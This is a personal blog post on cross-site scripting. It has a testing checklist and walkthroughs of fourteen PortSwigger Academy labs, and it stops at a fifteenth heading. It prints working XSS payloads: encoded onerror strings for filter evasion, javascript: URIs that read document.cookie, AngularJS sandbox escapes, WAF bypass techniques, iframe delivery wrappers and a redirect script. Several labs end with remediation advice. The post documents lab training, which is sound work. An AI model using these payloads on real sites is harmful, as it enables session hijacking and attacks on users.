---
layout: post
title: XSS (Cross site scripting)
subtitle: Victim visit malicious URL/site to trigger the payload made of JavaScript. Causing their session to be controlled or data to be stolen
date: 2025-09-15 19:15
author: Ren Sie
comments: true
category: script-input
thumbnail-img: /assets/img/githubpost/xxs_thumb.png
---

Cross-site scripting (XSS) is a web security flaw where attackers inject malicious scripts into trusted websites, which then execute in the browsers of unsuspecting users. This exploitation allows attackers to steal sensitive data, hijack user sessions, or manipulate website content by taking advantage of web applications that do not properly validate or sanitize user input.


{: .box-note}
**Note:** 💡 During the testing, use `print()` `prompt("text")` instead of `alert()` since `alert()` is commonly detected and filtered. <br> When testing for XXS, test for html injection first because it’s more likely to work
E.g., \<h1\>test\</h1\>

## Checklist
<details markdown="1">
  <summary>Click me to expand checklist</summary>  

1. **Is input reflected in the response?**

2. **Can we inject HTML?**
   - E.g., `https[://]victim[.]com/search?user=<img src=x onerror=prompt("XSS")>`
    
3. **Any weaknesses in the Content Security Policy (CSP)?**
   - Use of unsafe directives which allow execution of inline scripts or eval() functions, bypassing CSP protections. <br> E.g.,`Content-Security-Policy: script-src 'self' 'unsafe-inline' 'unsafe-eval';`
   - Allowing broad sources or wildcards in directives (e.g., script-src), which permits potentially untrusted external scripts to run. <br> E.g., `Content-Security-Policy: script-src *;`
   - Inclusion of compromised or vulnerable third-party domains in trusted sources, such as JSONP endpoints that can be exploited to inject malicious scripts. <br> E.g., `https[://]third-party_domain[.]com/jsonp?callback=prompt("xss is available!")`
   - Omitting strict directives for resources like object-src or failing to restrict nonces and hashes properly which can allow script injection.
   - Weak or predictable nonces (e.g., 'nonce-12345') that attackers can guess or reproduce to bypass CSP restrictions.
 
4. **Can we use events (e.g. onload, onerror)?**
   - `<body onload="prompt('XSS via onload!')"> Welcome to the website! </body>`
   - `<a href="https[://]trusted[.]com/search?user=<img src=x onerror=prompt("XXS Available")>"> Click me! </a>`

5. **Are there any filtered or escaped characters?**
   - E.g., `<`, `>`, `"`, `'`, `javascript:`, `alert()`
   - Refer to [XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)

6. **Is input stored and then later rendered?**

7. **Can we inject into non-changing values (e.g. usernames, comments, etc.)?**
   - E.g., web application allows user input and stores them without proper sanitization.

8. **Any input collected from a third party (e.g. account information)?**
   - Third-party inputs refer to any data or content that comes from an external source (via third-party api) or from other users.

9. Is the version of the framework or dependency vulnerable?
   - [OWASP Dependency-Check](https://github.com/dependency-check/DependencyCheck)
   - [OWASP Dependency-Check Installation and Scanning First project](https://www.youtube.com/watch?v=hWiI700y3J0)

</details>

### Reflected XXS
Inject payload into the HTTP request. And once the web server receive the request, it will response with the payload to sender’s browser. It relies on URL to make user fall for the attack.

### Dom-Based XXS
Client-side has vulnerable JavaScript. It doesn’t involve with the server-side, completely rely on client’s browser to execute the payload.
One quick check is turn on the developer tool, input and execute a simple prompt or alert script, see if there’s any network interaction with the server.

{: .box-note}
**Note:** 🚨 Inspecting Network page in the developer tab while sending input. If there’s no external communication happens, it indicates it is Dom-Based XXS.

#### Page Redirect
User could inject the following code into a vulnerable website, causing an automatic redirect to a malicious site. When a victim loads the page with this injected script, they will be automatically redirected to <$url>.
   ~~~
   src=x onerror="window.location.href='<$url>'"
   ~~~

### HTML Events
<details markdown="1">
<summary>Click me to reveal the chart of HTML events</summary>

| Event | Trigger Condition | Elements | Notes |
| :------ | :------ | :------ | :------ |
| onmouseover | When mouse pointer moves over an element | Most HTML elements including input | Used for hover interaction |
| onmouseout | When mouse pointer leaves an element | Most HTML elements including input | |
| onmousedown | When mouse button pressed over an element | Most elements | |
| onmouseup | When mouse button released over an element | Most elements | |
| onclick | When user clicks on an element | Most elements | Commonly used event |
| onfocus | When element receives focus (tab, click, or programmatic) | Input, textarea, select | Particularly useful for inputs |
| onblur | When element loses focus | Input, textarea, select | |
| onchange | When element's value is changed and the control loses focus | Input, select, textarea | Fires after commit of the change |
| oninput | When the user modifies the value | Input, textarea | Fires immediately as value changes |
| onerror | When loading of resource fails | img, script, iframe, media tags | Does not fire on input elements |
| onload | When resource loads successfully | body, img, iframe, script, media | Does not fire on input elements |
| onsubmit | When form is submitted | form element | |
| onkeydown | When a key is pressed | Most elements | |
| onkeyup | When a key is released | Most elements | |
  
</details>

### Store
Payload is stored in the database, and victim’s browser will retrieve it once it visit the page. For instance:  
1. In the attacker’s browser leave html injection comment: \<h1\>test\</h1\>.
2. Visit the same page from victim’s browser

![store_xxs.png](/assets/img/githubpost/xxs_1.png)

## Labs
Just for demostration, I completed some labs on [PortSwigger Academy](https://portswigger.net/web-security/all-labs#cross-site-scripting) to show how this vulnerability can lead to:

### 1. DOM-based XSS in document.write sink using source location.search
The target application use `document.write()` function to display content from `location.search`, which comes from the URL query string. Allows users to modify the URL, and to inject and execute arbitrary scripts in the page.
<details markdown="1">
  <summary>Click me to expand the process</summary>  
  
1. Enter random input (e.g., 123456) in the user input (URL query)
  ~~~
  https[://]web-security-academy.net/?search=123456
  ~~~
  
2. Right-click on the webpage and open the inspection tab
  
3. Press `Crtl+F` to open search function in inspection tab, and search for input (e.g., 123456)
  ~~~
  Result: <img src="/resources/images/tracker[.]gif?searchTerms=123456">
  ~~~
  
4. After knowing the syntax. We can add a closing angle bracket to close up the img tag, and add a new tag with the payload. I use HTML encoding to bypass the filter.
  ~~~
  URL: "><script src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041"></script>
  Result: <img src="/resources/images/tracker[.]gif?searchTerms=">
          <script src="x" onerror="javascript:alert('XSS')"></script>
  ~~~

</details>
-

### 2. DOM XSS in innerHTML sink using source location.search
The application It assigns data from `location.search` to `innerHTML`, which updates the contents of a `<div>`. Since the URL can be controlled by the user, they can inject malicious HTML or scripts.
<details markdown="1">
  <summary>Click me to expand the process</summary>  
  
1. Enter random input (e.g., 123456) in the user input (URL query)
  ~~~
  https[://]web-security-academy.net/?search=123456
  ~~~
  
2. Right-click on the webpage and open the inspection tab
  
3. Press `Crtl+F` to open search function in inspection tab, and search for input (e.g., 123456)
  ~~~
  Result: <span id="searchMessage">123456</span>
  ~~~
  
4. After knowing the syntax. I can add a closing tag to close up `<span>`, and add a new `<img>` tag with the payload. I use HTML encoding to bypass the filter.
  ~~~
  URL: https[://]web-security-academy[.]net/?search=</span><img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
  Result: <span id="searchMessage"><img src="x" onerror="javascript:alert('XSS')"></span> <span>'</span> == $0
  ~~~
  
</details>
-
  
### 3. DOM XSS in jQuery anchor href attribute sink using location.search source
In this instance, jQuery’s `$` selector is used to find a link and set its `href` using data from `location.search`, which comes from the URL query string.
<details markdown="1">
  <summary>Click me to expand the process</summary>
  
1. Right-click on the webpage and open the inspection tab. I search for `location.search`, which led me to this script:
  ```javascript
  $(function() {  
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));  
    });
  ```
  
2. I also notice that the URL contains the `returnPath` query parameter, which aligns with the script. Which uses this query parameter to set the href attribute of the backlink.
  ~~~
  URL: https[://]web-security-academy[.]net/feedback?returnPath=/
  ~~~
  
3. Insert the payload into the `returnPath` query parameter.
  ~~~
  URL: https[://]web-security-academy[.]net/feedback?returnPath=javascript:prompt(document.cookie)
  Result: <a id="backLink" href="javascript:prompt(document.cookie)">Back</a>
  ~~~
  
</details>
-

### 4. Stored XSS into anchor href attribute with double quotes HTML-encoded
This instance contains a stored XSS vulnerability in the comment section. I submit a comment that triggers an alert when the author’s name is clicked.
<details markdown="1">
  <summary>Click me to expand the process</summary>
  
1. In the comment section, there are four fields (Comment, Name, Email, Website). After filling out all the fields and submitting my comment, I notice that the Name section contains an external link, which is the website I enter while filling out the form.

2. I use the search function in the inspection tab to look for the website I enter. And I find:
   ~~~
   Result: <a id="author" href="Website.com">Name</a>
   ~~~

3. Now, I determine that the href attribute accepts user input, so I enter a simple payload into the Website field. It is confirmed that the alert will be triggered when I click on the Name.
   ~~~
   Website: javascript:alert('Zebra!')
   Result: <a id="author" href="javascript:alert('Zebra!')">World Smartest Zebra</a>
   ~~~
   
</details>
-

### 5. Reflected XSS into attribute with angle brackets HTML-encoded
The application contains a reflected XSS vulnerability in the search blog feature, where angle brackets are HTML-encoded. I inject an attribute via XSS that triggers an alert function.
<details markdown="1">
  <summary>Click me to expand the process</summary>
  
1. Enter random input (e.g., test123) in the user input (URL query)
  ~~~
  URL: https[://]web-security-academy[.]net/?search=test123
  ~~~
  
2. Utilize search function in inspection tab, and search for input (e.g., test123)
  ~~~
  Result: <input type="text" placeholder="Search the blog..." name="search" value="test123">
  ~~~
  
3. After learning that our input is within a double-quoted attribute, we can try to bypass the double-quoted attributes by breaking out of the attribute value with the injection of double quotes or equivalent encodings, and then adding the HTML events that triggers the payload.
  ~~~
  URL: https[://]web-security-academy[.]net/?search=test123" onmouseover="alert(test)
  Result: <input type="text" placeholder="Search the blog..." name="search" value="test123" onmouseover="alert(test)">
  ~~~

  {: .box-note}
  **Note:** The `value` attribute is closed early by the injected quote, and `onmouseover="alert(1)` is interpreted as a new `onmouseover` attribute on the \<input\> tag.

4. Once I hover the cursor over the search bar, it triggers the alert. I identify the XSS vulnerability.
</details>
-

### 6. DOM XSS in jQuery selector sink using a hashchange event
There is a DOM-based XSS vulnerability on the home page, where jQuery’s `$()` selector is used to auto-scroll to a post, with the title passed through `location.hash`.
<details markdown="1">
  <summary>Click me to expand the process</summary>
  
1. Firstly, I search for `$()` in the inspection tab, and I find the syntax for this function. Which listens for hash changes in the URL (`/#`) and scrolls the corresponding blog post into view based on the hash value.
  ```javascript
  $(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
    });
  ```
  
2. I append a simple XSS test payload with a hashtag to the URL, and the print function is triggered. The XSS vulnerability in this application is confirmed.
  ~~~
  URL: https[://]web-security-academy[.]net/#<img src=x onerror=print()>
  ~~~

3. In the case that I want to deliver this payload to others, I utilize `iframe`, `onload`, `img src`, and `onerror` to trigger the payload once they open the page.
  ~~~
  URL: <iframe src="https[://]web-security-academy[.]net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
  ~~~

  {: .box-note}
  **Note:** The `onload` attribute of the `iframe` runs JavaScript to append the print payload directly into the URL fragment after the page loads. The vulnerable page inside the iframe then reads this fragment (<img src=x onerror=print()>) and executes the injected payload.
  
</details>
-

### 7. Reflected XSS into a JavaScript string with angle brackets HTML encoded
In this instance, the application is vulnerable to reflected XSS in the search query tracking functionality, where angle brackets are encoded. The reflection occurs inside a JavaScript string. I break out of the string and triggers the `prompt()` function, to demonstrate the vulnerability.
<details markdown="1">
  <summary>Click me to expand the process</summary>
  
1. I enter random input (e.g., test) in the user input (search bar)
  
2. Utilize search function in inspection tab, and search for input (e.g., test). I find that the input is directly past into the function.
  ```javascript
    var searchTerms = 'test';
      document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
  ```
  
3. Now I learn that my input is inside the single quote, I try breaking out the single quote with:
  ~~~
  Input: '-prompt("TestXSS")-' # breaks the single quote
         or \\'-prompt("TestXSS")// # If single quotes are escaped
  ~~~
  
4. The message pops up after I send the query, which confirms that this instance is vulnerable to XSS. <br> Just to double-check, I pull out the script from the inspection tab.
  ```javascript
  var searchTerms = ''-prompt("TestXSS")-'';
  document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
  ```
  
</details>
-

### 8. DOM XSS in document.write sink using source location.search inside a select element
This instance contains a DOM-based XSS vulnerability in the stock checker functionality. It leverages the `document.write` function to output data to the page, using data from `location.search` that user can control through the website URL. The input data is between the `<option>` tag, I break out of it and calls the `prompt` function.
<details markdown="1">
  <summary>Click me to expand the process</summary>
  
1. Firstly, I discover the function in the inspection tab (`right-click on the webpage > inspect`).  
   And I learn that the script builds a `<select name="storeId">` dropdown by reading a `storeId` query parameter from the URL and, if present, adding it as the selected `<option>` before adding the three hard-coded stores (skipping any duplicate).  
   It uses `document.write` with the raw URL value, so unescaped input could be reflected into the page; creating elements and setting textContent/value.
   
   ```javascript
   var stores = ["London", "Paris", "Milan"];
   var store = (new URLSearchParams(window.location.search)).get('storeId');
   document.write('<select name="storeId">');
   if(store) {
       document.write('<option selected>' + store + '</option>');
   }

   for(var i = 0; i < stores.length; i++) {
       if(stores[i] === store) {
           continue;
       }
       document.write('<option>' + stores[i] + '</option>');
   }

   document.write('</select>');
   ```

2. After discovering that the function takes user input in the `storeId` parameter, I add the `storeId` parameter after the original `productId` parameter with a `&`. I then send a test input (test) to see the application's response. As expected, I am able to add a new selected `<option>`.
   ~~~
   URL: https[://]web-security-academy[.]net/product?productId=2&storeId=test
   Result:
   <select name="storeId">
     <option selected>test</option> # I create this option by inserting the parameter and value in the URL.
     <option>London</option>
     <option>Paris</option>
     <option>Milan</option>
   ~~~
  
3. Remember this syntax `document.write('<option>' + stores[i] + '</option>');` from the function. What I can do is close the first `<option>` tag, inject new HTML tags or event attributes, and then open another `<option>` tag. I try injecting a couple of new HTML tags, and both work. <br>Now, I can confirm that the stock search query function on this web application is vulnerable to XSS.
   ~~~
   Payload-1: storeId=test</option><iframe src="javascript:prompt('work?');"></iframe><option>
   Payload-2: storeId=test</option><script>prompt('work?')</script><option>
   ~~~

</details>
-

### 9. DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
This instance contains a DOM-based XSS vulnerability in an `AngularJS` expression within the search functionality. I inject a method (e.g. `$on`/`$eval`) that is available in the current scope to bypass AngularJS's security filter, append the `.constructor` property to create a `Function` object (`function(user_input)`), and then call it with `()` to execute the created function.

{: .box-note}
**Note:** Refer to [AngularJS DOM XSS Attack](https://www.youtube.com/watch?v=QpQp2JLn6JA) for more details walkthrough

<details markdown="1">
  <summary>Click me to expand the process</summary>

1. After did some researches ([AngularJS - Escaping the Expression Sandbox](https://spring.io/blog/2016/01/28/angularjs-escaping-the-expression-sandbox-for-xss), [Function() constructor](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function), [Object.prototype.constructor](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/constructor), ) I come up with a couple of different payloads to pybass the security filter.
  ~~~
  Payload-1: \{\{$eval.constructor(prompt('AngularJS_xss'))()\}\}
  Payload-2: \{\{$on.constructor('prompt("AngularJS_xss")')()\}\}
  ~~~
  
</details>
-

### 10. Reflected DOM XSS
In this instance, a script on the page processes reflected data (user input) with `eval()` without any sanitization and ultimately writes it to a dangerous sink.

<details markdown="1">
  <summary>Click me to expand the process</summary>

1. First, I find the script used in the web application under the Network tab on the Inspection page.
   - The `xhr.open` method sends a GET request (with user input retrieved from `path + window.location.search`) and fetches data from the server using `XMLHttpRequest`.
   - Then it parses the JSON response (`this.responseText`) with `eval()`.
   - Lastly, it dynamically create and display search results (`displaySearchResults`) in the HTML DOM.

   ```javascript
   var xhr = new XMLHttpRequest();
   xhr.onreadystatechange = function() {
      if (this.readyState == 4 && this.status == 200) {
          eval('var searchResultsObj = ' + this.responseText);
          displaySearchResults(searchResultsObj);
      }
   };
   xhr.open("GET", path + window.location.search);
   xhr.send();
   ```
   
2. I send a test request and intercept the response using Burp Proxy.

   ```json
   {"results":[],"searchTerm":"test"}
   ```

3. Because the script uses `eval()` to process the response, I can insert the `prompt()` function (see JSON Values in the [JSON Syntax](https://www.w3schools.com/js/js_json_syntax.asp))."
   Now that I know the JSON structure, I create an input to break out of the expected structure in Burp Repeater.

4. In the response to my first payload attempt `test\"-prompt()}//`, the double quote is escaped by the application, so I add an extra backslash (`\`) to bypass it.
   ~~~
   1-st_Request: ?search=test"-prompt()}//
   Response: {"results":[],"searchTerm":"test\"-prompt()}//"}
   -
   2-nd_Request: ?search=test\"-prompt()}//
   Response: {"results":[],"searchTerm":"test\\"-prompt()}//"}
   ~~~

   {: .box-note}
   **Note:** The [Arithmetic Operators](https://www.w3schools.com/programming/prog_operators_arithmetic.php#gsc.tab=0) (`-`) forces `prompt()` to be parsed and executed as part of an expression. And ensuring it is executed immediately, not just ignored.
   And the `//` comments out whatever is after it.

</details>
-

### 11. Stored DOM XSS
In this instance, the comment rendering is vulnerable to stored DOM‑based XSS because `escape()` only replaces the first `<`, `>` so I bypass it which leaves later tags unescaped, allowing arbitrary script execution when the page inserts comments into the DOM.

<details markdown="1">
  <summary>Click me to expand the process</summary>

1. Firstly, I look into the script used in the web application under the Network tab on the Inspection page. And I find there is an escape function using [replace()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace)

   ```javascript
    function escapeHTML(html) {
        return html.replace('<', '&lt;').replace('>', '&gt;');
    }
   ```

   {: .box-note}
   **Note:** A string pattern will only be replaced once. To perform a global search and replace, use a regex with the g flag, or use replaceAll() instead.

2. Now that I know only the first set of angle brackets is escaped and anything after that isn't, I craft my payload as:
   ~~~
   Payload: <><img src="x" onerror="prompt('I am escaped!')">
   Rendered:
   <p>
     &lt;&gt;
     <img src="x" onerror="prompt('I am escaped!')">
   </p>
   ~~~

3. A prompt pops up with a message after I submit (store) the payload in the comment section, which indicates the filter mechanism (`replace()` function) was bypassed and the application is still vulnerable to XSS."

</details>

**Suggestion**: Make the escaping correct (use [global replacements or replaceAll/regex](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#description)), deploy a strict [Content Security Policy](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html) that disallows inline handlers, and protect cookies (HttpOnly/SameSite) to reduce impact.

-

### 12. Reflected XSS into HTML context with most tags and attributes blocked
In this instance, the `/?search` parameter is being reflected into the page as HTML without proper contextual encoding or sanitization, and the WAF’s tag/attribute filtering is insufficient, so I bypass the filter and executes `prompt()`.

<details markdown="1">
  <summary>Click me to expand the process</summary>

1. After using general XSS testing payloads, I learn that the WAF is blocking some HTML tags to prevent common XSS.
   ~~~
   Payload: <img src="0" onerror="prompt()">
   Respond: "Tag is not allowed"
   ~~~

2. To find out which tag isn't blocked, I used Burp Intruder with all tag options as payload (retrieved from the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)). The result tells me that `<body>` is not blocked by the WAF.
   ~~~
   Burp Intruder:
     GET /?search=<Payload Position> HTTP/2
   ~~~

3. After enclosing payloads within the `<body>` tag, I learn that the WAF is also blocking some attributes.
   ~~~
   Payload: <body onload="prompt()">
   Respond: "Attributes is not allowed"
   ~~~

4. Repeating step 2, but this time I copy the events from the XSS cheat sheet. I got some events that comes back with 200 OK. 
   ~~~
   Burp Intruder:
     GET /?search=<body%20<Payload Position>=prompt()>
   ~~~

5. To make the exploitation more realistic, after going through the unfiltered event attributes:
   - I used an `<iframe>` to embeds this vulnerable webpage (`src="https[://]vulnerable[.]com/`).
   - The query parameter `/?search` then load the URL-encoded payload `%22%3E%3Cbody+onresize=prompt()%3E`
   - [this.style.width](https://www.w3schools.com/jsref/prop_style_width.asp) to adjust the iframe’s size, which will trigger the `onresize` event and `prompt()`.
   ~~~
   <iframe src="https[://]vulnerable[.]com/?search=%22%3E%3Cbody+onresize=prompt()%3E" onload=this.style.height='88px'></iframe>
   ~~~

6. Because I bypass the WAF filter with non-filterd tag and attribution, the function `prompt()` will be executed once someone clicks on the link.

</details>

**Suggestion**: Remediate by [treating user input strictly as data](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#xss-defense-philosophy) (encode/escape for the HTML context or render search terms as text nodes, never raw HTML), apply a server‑side allowlist sanitizer (or a vetted library such as [DOMPurify](https://www.npmjs.com/package/dompurify) when sanitization is required), enforce a strong [Content Security Policy](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html) that disallows inline event handlers/scripts, and [harden WAF normalization/rules](https://docs.oracle.com/en-us/iaas/Content/WAF/Protections/protections_management.htm) to catch decoded event-attribute payloads.

-

### 13. Reflected XSS into HTML context with all tags blocked except custom ones
In this instance, I find that the WAF blocks standard tags but allows custom element names. Because browser will parse custom tags as valid elements (`<cust-foo>`) and allow attributes (`onfocus`), I bypass the WAF and execute a prompt with custom tag, and other components to simulate the exploit in a real‑world scenario.

<details markdown="1">
  <summary>Click me to expand the process</summary>

1. I started by testing the input form, and the response indicated that the tag was blocked.
   ~~~
   Request: GET /?search=<script>test</script>
   Response: "Tag is not allowed"
   ~~~

2. Then I tried using a custom tag (`<cust-foo>`); this time, I did not receive any error. This confirms that the WAF does not block [custom tag](https://matthewjamestaylor.com/custom-tags).
   ~~~
   Request: GET /?search=<cust-foo>test</cust-foo>
   Response: HTTP/2 200 OK
   ~~~

3. The browser treats custom tags (`<cust-foo>`) as valid HTML elements and parses their attributes and event handlers (`onmouseover`), which execute JavaScript when triggered by moving the cursor over a specific spot.
   ~~~
   Request: GET /?search=<cust-foo onmouseover='prompt("xss")'>Move your mouse here</cust-foo>
   Response: A pop-up "xss"
   ~~~

4. To make the exploitation more realistic, I used custom tags with some components to create an .html file. As soon as a user opens it, they woulbe be redirected to the designated page and the prompt was executed: 
   - `window.location.assign()`: Redirect the user's browser to a new URL while keeping the current page in the session history (Back button available).
   - `id`: Gives the element a unique identifier in the DOM (e.g., a1).
   - `tabindex`: Makes the element focusable, which can be used with `onfocus` events.
   - `onfocus`: The JavaScript will be triggered when the element (`id`) receives focus.
   - `#a1`: Call out and focus on the element `a1`.

   ```javascript
    <script>
    window.location.assign("https[://]vulnerable[.]com/?search=<cust-tag id=a1 tabindex=1 onfocus='prompt("I am focusable")'>#a1")
    </script>
   ```
   
</details>

**Suggestion**: Use a proven HTML sanitizer (e.g. [DOMPurify](https://www.npmjs.com/package/dompurify)) on output that must contain HTML (server-side). Configure [allowlists](https://help.ivanti.com/ht/help/en_US/ISM/2025/admin-user/Content/Configure/SetUpWizard/Configure%20Allowed%20Tags%20and%20Attribute.htm), only permit required tags and attributes, and explicitly exclude all event handler attributes (e.g., on*). Apply the appropriate [encoding](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#output-encoding) based on where the data will be used (body, attribute, JavaScript string, URL, CSS), and do not rely on a single generic encoding for all contexts. Prefer [framework helpers](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#framework-security) and templating engines that provide automatic, correct output escaping rather than hand‑rolling your own escaping logic. Remove unnecessary HTML rendering of user‑supplied content whenever possible. If a field is a search query or otherwise simple text, return it as plain text (properly escaped) instead of rendering it as HTML with tags.

-

### 14. Reflected XSS with some SVG markup allowed
In this instance, I discovered a reflected XSS vector that bypasses the WAF by using certain unfiltered tags and event. By inserting those, I was able to execute JavaScript, demonstrating a reflected XSS bypass through SVG + SMIL animation events.

<details markdown="1">
  <summary>Click me to expand the process</summary>

1. I started by testing the input form, and the response indicated that the tag was blocked.
   ~~~
   Request: GET /?search=<script>prompt()</script>
   Response: "Tag is not allowed"
   ~~~

2.  To find out which tag isn't blocked, I used Burp Intruder with all tag options as payload (retrieved from the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)). The result tells me that `<animatetransform>`, `<image>`, `<svg>`, `<title>` are not blocked by the WAF.
   ~~~
   Burp Intruder:
     GET /?search=<Payload Position> HTTP/1.1
   ~~~

3. Next, to find out which event is not filtered. I repeated step 2 but copied the events from the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet). I use `<image>` as example since I know it is not filtered, then I received only `onbegin` events that returned 200 OK.
   ~~~
   Burp Intruder:
     GET /?search=<image+src="x"+<Payload Position>=1> HTTP/1.1
   ~~~

4. After some [researches](https://developer.mozilla.org/en-US/docs/Web/API/SVGAnimationElement/beginEvent_event, "SVGAnimationElement: beginEvent event"), I learned that `<svg>` and `<animatetransform>` can be used with `onbegin`. To test it out, I inserted `prompt()`, and the application responded with a pop‑up window containing my text, which proves that I bypassed the WAF's filters and executed a test script.
   ~~~
   <svg><animatetransform onbegin='prompt("Is this vulnerable to XSS?")'>
   ~~~
   
</details>

**Suggestion**: Treat any HTML or SVG in user input as untrusted. Ensure [server‑side output encoding](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#output-encoding) is applied. If you must allow HTML/SVG, sanitize server‑side with a library that understands and safely handles SVG (e.g., [DOMPurify](https://www.npmjs.com/package/dompurify)). Deploy a strict [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP) that avoids unsafe-inline and blocks inline script execution and data:/javascript: URLs (use script-src 'self' plus nonces/hashes if inline scripts are required).

-

### 15. Reflected XSS in canonical link tag
